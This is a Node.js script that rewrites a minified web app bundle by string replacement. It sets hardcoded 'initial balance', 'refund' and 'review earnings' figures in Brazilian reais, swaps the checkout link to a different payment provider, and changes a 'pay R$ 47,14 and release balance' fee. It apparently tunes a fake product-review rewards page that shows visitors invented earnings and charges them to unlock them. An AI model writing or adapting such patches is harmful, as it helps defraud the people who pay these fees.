const fs = require('fs');
let text = fs.readFileSync('assets/index-DQnUQezO.js', 'utf8');

const searchList = `d.jsx("div",{className:"bg-muted rounded-xl p-3",children:d.jsxs("div",{className:"flex justify-between items-center",children:[d.jsx("p",{className:"text-sm text-muted-foreground",children:"Saldo inicial (bônus)"}),d.jsxs("p",{className:"font-semibold text-foreground",children:["R$ ",1399.7.toFixed(2).replace(".",",")]})]})}),d.jsx("div",{className:"bg-muted rounded-xl p-3",children:d.jsxs("div",{className:"flex justify-between items-center",children:[d.jsx("p",{className:"text-sm text-muted-foreground",children:"Avaliações (10 produtos)"}),d.jsxs("p",{className:"font-semibold text-foreground",children:["R$ ",s.toFixed(2).replace(".",",")]})]})})`;

const replaceList = `d.jsx("div",{className:"bg-muted rounded-xl p-3",children:d.jsxs("div",{className:"flex justify-between items-center",children:[d.jsx("p",{className:"text-sm text-muted-foreground",children:"Saldo inicial"}),d.jsxs("p",{className:"font-semibold text-foreground",children:["R$ ","104,12"]})]})}),d.jsx("div",{className:"bg-muted rounded-xl p-3",children:d.jsxs("div",{className:"flex justify-between items-center",children:[d.jsx("p",{className:"text-sm text-muted-foreground",children:"Reembolso"}),d.jsxs("p",{className:"font-semibold text-foreground",children:["R$ ","37,00"]})]})}),d.jsx("div",{className:"bg-muted rounded-xl p-3",children:d.jsxs("div",{className:"flex justify-between items-center",children:[d.jsx("p",{className:"text-sm text-muted-foreground",children:"Avaliações(11)"}),d.jsxs("p",{className:"font-semibold text-foreground",children:["R$ ","2.957,88"]})]})})`;

text = text.replace(searchList, replaceList);
text = text.replace('[i,a]=x.useState(3099.7)', '[i,a]=x.useState(3099.0)');
text = text.replace('a(M.balance||1399.7)', 'a(M.balance||104.12)');
text = text.replace('q2="https://go.nexopayt.com.br/rpm0swi19c"', 'q2="https://go.perfectpay.com.br/PPU38CQD1NL"');
text = text.replace('d.jsxs("p",{className:"text-2xl font-bold text-foreground",children:["R$ ",97 .toFixed(2).replace(".",",")]})', 'd.jsxs("p",{className:"text-2xl font-bold text-foreground",children:["R$ ","47,14"]})');
text = text.replace('children:["Pagar R$ ",97 .toFixed(2).replace(".",",")," e Liberar Saldo"', 'children:["Pagar R$ ","47,14"," e Liberar Saldo"');

fs.writeFileSync('assets/index-DQnUQezO.js', text);
console.log('Done!');
